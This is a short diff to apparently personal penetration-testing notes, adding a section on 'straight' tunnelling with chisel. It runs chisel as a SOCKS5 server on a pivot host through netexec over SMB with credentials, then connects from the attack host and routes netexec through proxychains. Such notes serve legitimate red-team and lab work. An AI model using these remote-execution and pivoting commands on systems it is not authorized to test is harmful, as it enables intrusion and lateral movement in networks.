@@ -81,3 +81,20 @@ nxc smb $IP -u [user] -p [pass] -X 'Stop-Process -Name chisel -Force'
 ```
 'CTRL-C' to kill the server on the attack host
 
+### Straight Tunnel
+* Same setup as the reverse tunnel
+* Start the server on the pivot host
+```bash
+# Example using netexec
+nxc smb $IP -u [user] -p [pass] -x 'C:\Windows\Temp\chisel.exe server --socks5'
+```
+* Connect to the chisel server from our attack host
+```bash
+sudo chisel client [IP]:[port] socks
+```
+* Entries in /etc/proxychains4.conf are the same as for the reverse tunnel.
+* Verify operation
+```bash
+sudo proxychains4 -q nxc smb $IP -u [user] -p [pass] --shares
+```
+
